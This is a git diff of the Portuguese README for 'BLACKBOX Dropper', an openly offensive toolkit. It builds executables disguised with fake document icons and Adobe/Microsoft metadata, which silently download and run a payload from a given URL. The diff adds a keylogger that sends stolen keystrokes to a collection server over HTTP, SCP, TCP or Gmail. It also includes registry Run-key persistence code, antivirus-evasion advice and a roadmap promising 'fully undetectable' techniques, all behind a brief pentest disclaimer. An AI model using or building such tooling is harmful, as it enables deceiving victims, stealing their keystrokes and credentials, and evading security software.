@@ -1,4 +1,4 @@
-# BLACKBOX Dropper
+# 🐦‍⬛ BLACKBOX Dropper
 
 **Versão:** v1.0  
 **Autor:** [Guilherme Alexander](https://github.com/Guilherme-alexander)  
@@ -7,13 +7,18 @@
 
 ---
 
-## Sobre
+## 📋 Sobre
 
-BLACKBOX Dropper é uma ferramenta de pentest dedicada a criar **droppers** de arquivos. Os arquivos baixados no sistema alvo são executados sem dupla execução do `.exe`, apenas do arquivo embutido (PDF, DOCX, XLSX, JPG/PNG).
+**BLACKBOX Dropper** é uma ferramenta de pentest dedicada a criar **droppers** e **keyloggers** com suporte a múltiplos protocolos de exfiltração de dados.
 
-Para comprometer o mesmo alvo novamente, é necessário deletar a pasta no sistema alvo:  
-`C:\Users\Public\Libraries\Intel`  
-Pois o dropper verifica a existência dela para decidir o que fazer.
+### 🎯 Funcionalidades Principais
+
+- 📦 **Droppers**: Cria executáveis disfarçados (PDF, WORD, EXCEL, IMAGE)
+- 🐝 **HiveServer**: Servidor central para coleta de logs com múltiplos protocolos
+- 🔌 **Múltiplos Protocolos**: HTTP, SSH/SCP, TCP Socket e E-mail (Gmail)
+- 🖥️ **Cross-Platform**: Funciona no Windows 10/11 e Linux
+- 🔒 **Persistência**: Registro automático no Windows
+- 🎭 **Disfarce**: Ícones e metadados falsos (Adobe/Microsoft)
 
 ---
 
@@ -30,61 +35,93 @@ RESPONSABILIDADE, SEJA EM CONTRATO, RESPONSABILIDADE ESTRITA OU DELITO
 MESMO QUE CIENTE DA POSSIBILIDADE DE TAIS DANOS."
 ```
 
-**USE ESTA FERRAMENTA APENAS PARA FINS EDUCACIONAIS OU TRABALHO (PENTEST)!**
+**🔴 USE ESTA FERRAMENTA APENAS PARA FINS EDUCACIONAIS OU TRABALHO (PENTEST)!**
 
 ---
 
-## Funcionalidades
+## 🚀 Novidades
 
-- ✅ Baixa executável no sistema alvo
-- ✅ Execução silenciosa (sem janelas)
-- ✅ Baixa e executa o executável apenas uma vez
-- ✅ Se o EXE já foi baixado e está rodando, abre apenas o PDF/DOCX/XLSX/JPG/PNG
-- ✅ Métodos de phishing incluídos (disfarce com ícones e metadados)
-- ✅ Sessões múltiplas desabilitadas (evita execução duplicada)
-- ✅ Bypass UAC (sem necessidade de privilégios administrativos)
-- ✅ Suporte para Windows e Linux
-- ✅ Interface em Português-BR
-- ✅ Compilação automática com PyInstaller
-- ✅ Metadados falsos (Adobe/Microsoft)
+### v1.0 - HiveServer Integration
+
+- 🐝 **HiveServer**: Servidor central para coleta de logs
+- 🔌 **Múltiplos Protocolos**:
+  - 🌐 **HTTP/HTTPS**: Servidor web com endpoint `/log`
+  - 🔒 **SSH/SCP**: Envio para servidor remoto (Windows/Linux)
+  - 📡 **TCP Socket**: Comunicação direta via sockets
+  - ✉️ **E-mail**: Envio via Gmail SMTP
+- 🎨 **Interface Melhorada**: Cores em branco, amarelo e vermelho
+- 🖥️ **Cross-Platform Total**: Windows 10/11 e Linux
+- 📦 **Instaladores**: Scripts para Windows (BAT/PS1) e Linux (SH)
+- 📚 **Documentação Completa**: README e AUTHOR atualizados
 
 ---
 
-## Dependências
+## 📦 Dependências
 
 ### Linux (Ubuntu/Debian/Kali):
 
-O BLACKBOX usa **Python 3** para execução, mas a compilação de executáveis Windows via Wine requer **Python 2.7**:
-
 ```bash
-# 1. Instalar Python 3 e dependências do sistema
+# Instalar dependências do sistema
 sudo apt update
 sudo apt install -y wine wget python3 python3-pip
 
-# 2. Instalar PyInstaller para Python 3 (sistema)
+# Instalar PyInstaller para Python 3
 pip3 install pyinstaller
 
-# 3. Baixar e instalar Python 2.7 no Wine
+# Instalar Python 2.7 no Wine (para compilação)
 wget https://www.python.org/ftp/python/2.7.18/python-2.7.18.msi
 wine msiexec /i python-2.7.18.msi /quiet
 
-# 4. Instalar PyInstaller no Wine (Python 2.7)
+# Instalar PyInstaller no Wine
 wine /root/.wine/drive_c/Python27/python.exe -m pip install pyinstaller
-
-# 5. Verificar instalação
-wine /root/.wine/drive_c/Python27/python.exe -c "import PyInstaller; print('OK')"
 ```
 
-### Windows:
-
-No Windows, apenas Python 3 + PyInstaller são necessários:
+### Windows 10/11:
 
 ```powershell
-# Instalar Python 3
-# Baixar em: https://www.python.org/downloads/
-
+# Instalar Python 3 (baixar de python.org)
 # Instalar PyInstaller
 pip install pyinstaller
+
+# Para SSH (opcional): instalar OpenSSH Client
+# Já vem instalado no Windows 10/11
+```
+
+---
+
+## 🔧 Instalação
+
+### 📥 Clonar o Repositório
+
+```bash
+git clone https://github.com/Guilherme-alexander/BLACKBOX.git
+cd BLACKBOX
+```
+
+### 🐧 Linux
+
+```bash
+# Dar permissão de execução
+chmod +x main.py HiveServer.py
+
+# Executar o instalador (recomendado)
+sudo ./install.sh
+
+# Ou executar diretamente
+sudo python3 main.py
+```
+
+### 🪟 Windows
+
+```cmd
+# Executar o instalador (recomendado)
+install.bat
+
+# Ou via PowerShell (como administrador)
+.\install.ps1
+
+# Executar
+python main.py
 ```
 
 ---
@@ -95,204 +132,296 @@ pip install pyinstaller
 BLACKBOX/
 │
 ├── main.py                 # Script principal (Python 3)
-├── README.md               # Este arquivo
+├── HiveServer.py           # Servidor central de logs
+├── README.md               # Documentação principal
+├── AUTHOR.md               # Informações do autor
+├── LICENSE                 # Licença BSD-3-Clause
+│
+├── install.bat             # Instalador Windows (BAT)
+├── install.ps1             # Instalador Windows (PowerShell)
+├── install.sh              # Instalador Linux
 │
 ├── dist/                   # Droppers gerados (saída)
+├── hive_logs/              # Logs coletados pelo HiveServer
 │
 ├── Icons/                  # Ícones para disfarce
 │   ├── pdf.ico
 │   ├── word.ico
 │   ├── excel.ico
 │   ├── img.ico
-│   └── flash.ico
+│   ├── flash.ico
+│   ├── acrobat.ico
+│   └── powerpoint.ico
 │
 ├── Manifest/
-│   └── manifest.manifest   # Manifesto do Windows (nível de privilégio)
+│   └── manifest.manifest   # Manifesto do Windows
 │
-├── Resource/               # Metadados dos arquivos
-│   ├── pdf.template        # Metadados - Adobe PDF
-│   ├── word.template       # Metadados - Microsoft Word
-│   └── excel.template      # Metadados - Microsoft Excel
+├── Resource/               # Metadados
+│   ├── pdf.template
+│   ├── word.template
+│   ├── excel.template
+│   ├── adobe.template
+│   ├── acrobat.template
+│   └── powerpoint.template
 │
 └── Templates/
-    └── U_dRoP.py           # Template do dropper (Python 2/3 compatível)
+    ├── Bee.py              # Template do Keylogger
+    └── U_dRoP.py           # Template do Dropper
 ```
 
 ---
 
-## Instalação
+## 🎮 Como Usar
 
-### Clonar o repositório:
-
-```bash
-git clone https://github.com/Guilherme-alexander/BLACKBOX.git
-cd BLACKBOX
-```
-
-### Linux:
-
-```bash
-# Dar permissão de execução
-chmod +x main.py
-
-# Executar como root (necessário para Wine)
-sudo python3 main.py
-```
-
-### Windows:
-
-```powershell
-# Executar diretamente
-python main.py
-```
-
----
-
-## Como Usar
-
-### Menu Principal:
+### 🏠 Menu Principal
 
 Ao executar o BLACKBOX, você verá:
 
-```cmd
-
-    ╔════════════════════════════════════════════════════════════════╗
-    ║                      BLACKBOX DROPPER v1.0                     ║
-    ╚════════════════════════════════════════════════════════════════╝
-    ╔═══════════════════════════════════╗
-    ║  📦  PACOTE ENTREGUE COM SUCESSO  ║
-    ╚═══════════════════════════════════╝
-    ┌────────────────────────────────────┐
-    │  ┌──────────────────────────────┐  │
-    │  │  📦  👾  📦  📦  👹  📦  🕷   │  │
-    │  │  📦  📦  🐞  📦  📦  📦  📦  ███████████████████████████████
-    │  │  👾  📦  📦  👹  📦  👾  📦  📦  📦  👹  👾  📦  👾  👾
-    │  │  📦  👹  📦  📦  🐞  📦  📦  ███████████████████████████████
-    │  │  🕷   📦  📦  👾  🐞  📦  👹  │  │
-    │  └──────────────────────────────┘  │
-    │  │ DROPPER READY                │  │
-    └────────────────────────────────────┘
-
-        [1] Gerar Dropper        por: Guilherme Alexander
-        [2] Ajuda                https://github.com/Guilherme-alexander
-        [0] Sair
-
-Selecione uma opção do menu:
-
- BLACKBOX >>
 ```
 
-### Submenu de Geração (após escolher opção 1):
+     ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗  ██████╗ ██╗  ██╗
+     ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗╚██╗██╔╝
+     ██████╔╝██║     ███████║██║     █████╔╝ ██████╔╝██║   ██║ ╚███╔╝
+     ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══██╗██║   ██║ ██╔██╗
+     ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝██╔╝ ██╗
+     ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
+
+                        🔒 DROPPER & KEYLOGGER SUITE 🔒
+
+    ┌─────────────────────────────────────────────────────────────────┐
+    │                                                                 │
+    │  ▶  [1]  Gerar Dropper                                          │
+    │  ▶  [2]  KeyLogger HiveServer                                   │
+    │  ▶  [3]  Ajuda / Documentação                                   │
+    │  ▶  [0]  Sair                                                   │
+    │                                                                 │
+    └─────────────────────────────────────────────────────────────────┘
+
+    by: Guilherme Alexander • https://github.com/Guilherme-alexander
+    version: 1.0  •  ⬛‍ BLACKBOX  •  🐝 Hive
+
+┌─[ BLACKBOX ]─[ Escolha uma opção ]
+└╼>
+```
+
+### 📦 Opção 1: Gerar Dropper
+
+Cria executáveis disfarçados que baixam e executam payloads:
 
 ```
-[1] PDF DROPPER    - PDF + Executável
-[2] WORD DROPPER   - DOCX + Executável
-[3] EXCEL DROPPER  - XLSX + Executável
-[4] IMAGE DROPPER  - JPG/PNG + Executável
-[0] Voltar
+    ┌─────────────────────────────────────────────────────┐
+    │                📦 TIPOS DE DROPPER                  │
+    ├─────────────────────────────────────────────────────┤
+    │                                                     │
+    │     [1]  PDF DROPPER     (PDF + EXE)                │
+    │     [2]  WORD DROPPER    (DOCX + EXE)               │
+    │     [3]  EXCEL DROPPER   (XLSX + EXE)               │
+    │     [4]  IMAGE DROPPER   (JPG/PNG + EXE)            │
+    │                                                     │
+    │     [0]  Voltar ao menu principal                   │
+    │                                                     │
+    └─────────────────────────────────────────────────────┘
+
+┌─[ DROPPER ]─[ Selecione o tipo ]─
+└╼>
 ```
 
-### Exemplo de Uso Completo:
-
+**Exemplo de Uso:**
 ```bash
-# 1. Inicie o BLACKBOX
-sudo python3 main.py
-
-# 2. No menu principal, digite 1
 BLACKBOX >> 1
 
-# 3. No submenu, escolha o tipo (ex: 1 para PDF)
-BLACKBOX >> 1
-
-# 4. Insira as URLs solicitadas
 📥 URL do EXE para baixar: http://192.168.1.100/payload.exe
 📄 URL do arquivo para embutir: http://192.168.1.100/documento.pdf
 
-# 5. Aguarde a compilação (pode levar alguns segundos)
 [*] Construindo dropper...
-
-# 6. Arquivo gerado com sucesso!
 ✅ Dropper salvo em: dist/Blackbox_Pdf_.pdf.exe
 ```
 
----
+### 🐝 Opção 2: HiveServer
 
-## Como Funciona o Dropper
+Servidor central para coleta de logs com múltiplos protocolos:
 
-### 1. Geração do Dropper
+```
+    ╔════════════════════════════════════════════════════════════╗
+    ║                      🐝 HIVE SERVER                        ║
+    ║                 Servidor Central BLACKBOX                  ║
+    ║            https://github.com/Guilherme-alexander          ║
+    ╚════════════════════════════════════════════════════════════╝
+    ╔════════════════════════════════════════════════════════════╗
+    ║  [1] Iniciar Servidor                                      ║
+    ║  [2] Configurar Protocolos                                 ║
+    ║  [3] Gerar KeyLogger                                       ║
+    ║  [4] Visualizar Logs                                       ║
+    ║  [5] Limpar Logs                                           ║
+    ║  [0] Voltar ao BLACKBOX                                    ║
+    ╚════════════════════════════════════════════════════════════╝
 
-O processo de geração segue estas etapas:
-
-1. **Leitura do Template**: O arquivo `Templates/U_dRoP.py` é lido
-2. **Injeção de URLs**: As URLs fornecidas são inseridas no código
-3. **Geração do D.py**: Um arquivo temporário é criado com o payload completo
-4. **Compilação**: O PyInstaller compila `D.py` para um executável Windows (`.exe`)
-5. **Personalização**: Ícones e metadados são aplicados para disfarce
-6. **Limpeza**: Arquivos temporários são removidos
-7. **Entrega**: O dropper final fica em `dist/`
-
-### 2. Execução no Sistema Alvo
-
-Quando a vítima executa o dropper (que parece ser um PDF/DOCX/etc):
-
-1. **Criação de Diretório**: Cria `C:\Users\Public\Libraries\Intel\`
-2. **Download do Documento**: Baixa o PDF/DOCX/XLSX/JPG da URL fornecida
-3. **Abertura do Documento**: Abre o documento para disfarçar a atividade
-4. **Download do Payload**: Baixa o executável malicioso da URL fornecida
-5. **Execução do Payload**: Executa o payload silenciosamente em background
-6. **Persistência**: Se executado novamente, apenas abre o documento (evita duplicação)
-
-### 3. Técnicas de Evasão
-
-- **Disfarce Visual**: O ícone do arquivo é igual ao de um documento legítimo
-- **Metadados Falsos**: As propriedades do arquivo mostram Adobe/Microsoft
-- **Execução Silenciosa**: O payload roda sem janelas visíveis
-- **Localização Oculta**: Os arquivos são salvos em uma pasta pouco monitorada
-- **Verificação de Existência**: Evita múltiplas execuções do mesmo payload
-
----
-
-## Personalização
-
-### Alterar o Comportamento do Dropper
-
-Edite `Templates/U_dRoP.py` para modificar:
-
-```python
-# Mudar diretório de instalação
-dir = "C:\\Users\\Public\\Libraries\\Intel\\" + nameem
-
-# Mudar nome do executável
-nameem = 'adobeflashplayer' + '.exe'
-
-# Adicionar persistência no registro
-# Adicionar comandos adicionais
+ [+] HIVE (🐝) >>
 ```
 
-### Adicionar Novos Ícones
+#### 🔌 Configurar Protocolos (Opção 2)
 
-1. Coloque arquivos `.ico` em `Icons/`
-2. Atualize o `main.py` adicionando novas configurações
+Selecione os protocolos que deseja usar:
 
-### Modificar Metadados
+```
+╔════════════════════════════════════════════════════════════╗
+║           SELECIONE OS PROTOCOLOS ATIVOS                   ║
+╠════════════════════════════════════════════════════════════╣
+║  [1] HTTP/HTTPS   (Servidor Web)                           ║
+║  [2] SSH/SCP      (Envio para servidor remoto)             ║
+║  [3] TCP Socket   (Conexão TCP pura)                       ║
+║  [4] E-mail       (Gmail)                                  ║
+║  [0] Continuar                                             ║
+╚════════════════════════════════════════════════════════════╝
+```
 
-Edite os arquivos em `Resource/` para alterar:
+**Configuração SSH:**
+```
+🌐 Host SSH (ex: 192.168.1.100): 192.168.1.100
+👤 Usuário SSH: root
+🔑 Usar chave SSH? (s/N): s
+📁 Caminho da chave privada: ~/.ssh/id_rsa
+🔌 Porta SSH (Enter para 22): 22
+📁 Caminho remoto (Enter para /var/log/hive/): /var/log/hive/
+```
 
-- `pdf.template` - Metadados do Adobe PDF
-- `word.template` - Metadados do Microsoft Word
-- `excel.template` - Metadados do Microsoft Excel
+**Configuração TCP:**
+```
+🔌 Porta TCP (Enter para 9999): 9999
+```
+
+**Configuração E-mail:**
+```
+📧 E-mail Gmail: seu_email@gmail.com
+🔑 Senha do Gmail: ********
+```
+
+#### 🎯 Gerar KeyLogger (Opção 3)
+
+Gera um keylogger com as configurações dos protocolos ativos:
+
+```
+╔════════════════════════════════════════════════════════════╗
+║           SELECIONE O TIPO DE KEYLOGGER                    ║
+╠════════════════════════════════════════════════════════════╣
+║  [1] Adobe Flash Update   (Ícone Flash)                    ║
+║  [2] Fake Word docx      (Ícone Word)                      ║
+║  [3] Fake Excel xlsx     (Ícone Excel)                     ║
+║  [4] Fake Powerpoint pptx (Ícone PowerPoint)               ║
+║  [5] Fake Acrobat pdf   (Ícone PDF)                        ║
+║  [6] Blank Executable   (Sem ícone)                        ║
+╚════════════════════════════════════════════════════════════╝
+```
 
 ---
 
-## Testado em
+## 🔌 Protocolos do HiveServer
 
-### Sistemas de Desenvolvimento (Linux):
+### 🌐 HTTP/HTTPS
+- **Endpoint:** `POST /log`
+- **Formato:** JSON
+- **Exemplo:**
+```json
+{
+    "hostname": "PC-ALVO",
+    "data": "logs do teclado...",
+    "timestamp": "2026-09-01T10:30:00"
+}
+```
+
+### 🔒 SSH/SCP
+- **Método:** SCP (cópia segura)
+- **Suporte:** Windows (OpenSSH/Git Bash) e Linux
+- **Autenticação:** Senha ou Chave SSH
+- **Local:** Diretório configurado no servidor remoto
+
+### 📡 TCP Socket
+- **Porta:** Configurável (padrão 9999)
+- **Formato:** Texto puro
+- **Exemplo:** `[HOSTNAME] TIMESTAMP\nlogs...`
+
+### ✉️ E-mail (Gmail)
+- **SMTP:** smtp.gmail.com:587
+- **TLS:** StartTLS
+- **Formato:** E-mail com anexo de texto
+
+---
+
+## 🎨 Interface do HiveServer
+
+### 📊 Visualizar Logs (Opção 4)
+
+```
+╔════════════════════════════════════════════════════════════╗
+║                    VISUALIZAR LOGS                         ║
+╚════════════════════════════════════════════════════════════╝
+
+Arquivos de log disponíveis:
+
+  [1] PC-ALVO_192.168.1.100.log (2.3 KB)
+  [2] PC-TESTE_192.168.1.101.log (1.1 KB)
+
+Selecione um arquivo (0 para voltar): 1
+```
+
+### 🧹 Limpar Logs (Opção 5)
+
+```
+[!] Tem certeza que deseja limpar todos os logs? (s/N): s
+[+] Logs limpos!
+```
+
+---
+
+## 🛠️ Personalização
+
+### 📝 Alterar Template do Keylogger
+
+Edite `Templates/Bee.py` para modificar o comportamento do keylogger:
+
+```python
+# Alterar intervalo de envio (padrão 120 segundos)
+sleep(60)  # Envia a cada 60 segundos
+
+# Alterar tamanho mínimo do buffer (padrão 30 caracteres)
+if len(data_buffer) > 50:  # Envia com 50+ caracteres
+
+# Adicionar novas teclas especiais
+keys = {
+    13: ' [ENTER] ',
+    # Adicione mais teclas aqui
+}
+```
+
+### 🎭 Adicionar Novos Ícones
+
+1. Coloque arquivos `.ico` em `Icons/`
+2. Atualize `main.py` ou `HiveServer.py` com as novas configurações
+
+```python
+# Exemplo em HiveServer.py
+configs = {
+    '7': {
+        'version': 'Resource/novo.template',
+        'icon': 'Icons/novo.ico',
+        'name': 'Bee_Novo_.exe',
+        'manifest': '--manifest=Manifest/manifest.manifest',
+        'desc': 'Novo Tipo'
+    }
+}
+```
+
+---
+
+## 🧪 Testado em
+
+### 🐧 Sistemas de Desenvolvimento (Linux)
 - ✅ Kali Linux (ROLLING)
 - ✅ Ubuntu 20.04 LTS / 22.04 LTS
 - ✅ Debian 10/11
 - ✅ Linux Mint 20/21
 
-### Sistemas Alvo (Windows):
+### 🪟 Sistemas Alvo (Windows)
 - ✅ Windows 7 (x86/x64)
 - ✅ Windows 8.1 (x86/x64)
 - ✅ Windows 10 (x86/x64)
@@ -302,49 +431,46 @@ Edite os arquivos em `Resource/` para alterar:
 
 ## ❓ Perguntas Frequentes
 
-### Por que Python 2.7 no Wine se o projeto é Python 3?
+### Por que Python 2.7 no Wine?
 
-O **BLACKBOX Dropper** usa Python 3 para rodar (`main.py`), mas a compilação de executáveis Windows via Wine no Linux requer Python 2.7 porque:
+O **BLACKBOX Dropper** usa Python 3 para rodar (`main.py`), mas a compilação de executáveis Windows via Wine no Linux requer Python 2.7 porque o PyInstaller via Wine tem melhor compatibilidade com Python 2.7.
 
-- O PyInstaller no Wine foi originalmente configurado com Python 2.7
-- A versão do PyInstaller que funciona via Wine tem melhor compatibilidade com Python 2.7
-- O template `U_dRoP.py` é compatível com **Python 2 e 3** (graças ao `try/except` no código)
-
-**Resumo:** 
+**Resumo:**
 - 🐍 **Sistema host**: Python 3 (para rodar o BLACKBOX)
 - 🍷 **Wine**: Python 2.7 (para compilar os droppers .exe)
 - 📦 **Template**: Compatível com ambas as versões
 
-### Por que o dropper só funciona uma vez no alvo?
+### Como o keylogger envia logs?
 
-O dropper verifica se a pasta `C:\Users\Public\Libraries\Intel\` existe. Se já existir, ele apenas abre o documento e não baixa/executa o payload novamente. Para recomprometer o alvo, delete esta pasta manualmente.
+O keylogger suporta múltiplos protocolos configuráveis:
 
-### Como fazer o dropper persistir no sistema?
+1. **HTTP**: Envia JSON para o servidor web
+2. **SSH/SCP**: Envia arquivos via SCP
+3. **TCP**: Envia texto via socket TCP
+4. **E-mail**: Envia via Gmail SMTP
 
-Edite o template `Templates/U_dRoP.py` e adicione:
+### O dropper funciona com antivírus?
 
-```python
-# Exemplo de persistência no registro
-import winreg
-key = winreg.HKEY_CURRENT_USER
-subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
-winreg.SetValueEx(handle, "WindowsUpdate", 0, winreg.REG_SZ, dir)
-winreg.CloseKey(handle)
-```
-
-### O dropper funciona em sistemas com antivírus?
-
-O BLACKBOX usa técnicas básicas de evasão, mas antivírus modernos podem detectar. Para testes mais avançados, considere:
+O BLACKBOX usa técnicas básicas de evasão, mas antivírus modernos podem detectar. Para testes mais avançados:
 
 - Ofuscação de código
 - Empacotamento (packing)
 - Assinatura digital
 - Técnicas de evasão de sandbox
 
+### Como fazer o dropper persistir?
+
+O dropper já tem persistência via registro do Windows. Para modificar:
+
+```python
+# Em Templates/U_dRoP.py
+dir = "C:\\Users\\Public\\Libraries\\Intel\\" + nameem
+# O dropper se copia para este diretório
+```
+
 ---
 
-## Segurança e Ética
+## 🔒 Segurança e Ética
 
 - ✅ **Use apenas em ambientes autorizados**
 - ✅ **Mantenha em VMs isoladas**
@@ -360,7 +486,7 @@ Este projeto é licenciado sob a licença **BSD-3-Clause** - veja o arquivo [LIC
 
 ---
 
-## Agradecimentos
+## 🙏 Agradecimentos
 
 - [Alisson Moretto (4w4k3)](https://github.com/4w4k3) - Criador do Umbrella Dropper
 - Comunidade de Pentest e Segurança da Informação
@@ -372,11 +498,44 @@ Este projeto é licenciado sob a licença **BSD-3-Clause** - veja o arquivo [LIC
 
 - **GitHub:** [https://github.com/Guilherme-alexander](https://github.com/Guilherme-alexander)
 - **Projeto Original:** [Umbrella Dropper](https://github.com/4w4k3/Umbrella)
+- **🐝 HiveServer:** Servidor central integrado
 
 ---
 
 ## ⭐ Considerações Finais
 
-**BLACKBOX Dropper** é uma ferramenta poderosa para testes de penetração, mas com grande poder vem grande responsabilidade.
+**BLACKBOX Dropper** é uma ferramenta poderosa para testes de penetração, com grande poder vem grande responsabilidade.
 
 > *"Um espírito nobre engrandece o menor dos homens"*
+
+**🐦‍⬛ BLACKBOX Dropper • 🐝 HiveServer • 🔒 Security**
+
+---
+
+## 📊 Roadmap
+
+- [ ] Suporte a TLS/SSL no servidor HTTP
+- [ ] Interface web para visualização de logs
+- [ ] Banco de dados SQLite para logs
+- [ ] Suporte a Telegram/Webhook
+- [ ] Ofuscação automática de código
+- [ ] FUD (Fully Undetectable) techniques
+- [ ] Suporte a macOS
+
+---
+
+**Versão:** v1.0  
+**Última Atualização:** Setembro 2026  
+**Autor:** Guilherme Alexander
+
+```bash
+╔═══════════════════════════════════════════════════════════════════╗
+║                                                                   ║
+║     🌟 OBRIGADO POR USAR O BLACKBOX DROPPER!                      ║
+║                                                                   ║
+║     🔗 https://github.com/Guilherme-alexander                     ║
+║                                                                   ║
+║     🐝 HiveServer  •  🐦‍⬛ BLACKBOX  •  🔒 Security              ║
+║                                                                   ║
+╚═══════════════════════════════════════════════════════════════════╝
+```
